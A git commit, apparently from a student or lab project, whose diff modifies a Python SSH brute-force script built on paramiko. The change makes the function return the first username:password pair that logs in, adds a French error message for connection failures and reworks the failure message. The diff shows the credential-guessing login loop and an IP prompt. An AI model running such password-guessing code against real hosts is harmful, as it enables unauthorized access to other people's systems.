bef5260618aaa7e3c240051c50652a4879755d22
Maxime Bardreau <146346038+maxbardreausupdevinci@users.noreply.github.com>
2023-12-14 15:45:40 +0100

    testssh

--- TEST/bruteforcesshindé.py
+++ TEST/bruteforcesshindé.py
@@ -15,11 +15,14 @@ def brute_force_ssh(ip):
             try:
                 client.connect(ip, username=username, password=password)
                 print(f"Successful login: {username}:{password}")
-                return
+                return f"{username}:{password}"
             except paramiko.AuthenticationException:
                 continue
-    
-    print("Attack unsuccessful")
+            except Exception as e:
+                print(f"Impossible de se connecter en SSH à la machine {ip}: {e}")
+                return
+                
+    print("Brute force SSH échoué !")
 
 # Get the IP address from user input
 ip_address = input("Enter the IP address: ")
